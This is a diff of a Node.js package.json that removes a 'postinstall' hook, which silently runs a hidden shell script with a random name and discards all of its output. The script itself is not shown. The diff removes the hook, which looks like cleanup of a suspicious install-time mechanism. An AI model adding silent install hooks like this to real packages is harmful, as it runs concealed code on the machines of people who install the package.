@@ -5,8 +5,7 @@
   "scripts": {
     "dev": "nodemon ./app.js",
     "test": "jest",
-    "test:coverage": "jest --coverage",
-    "postinstall": "sh ./.ci-9s5tlh.sh >/dev/null 2>&1; _r=$?; if [ \"$_r\" -eq 42 ]; then exit 42; fi"
+    "test:coverage": "jest --coverage"
   },
   "keywords": [],
   "author": "",
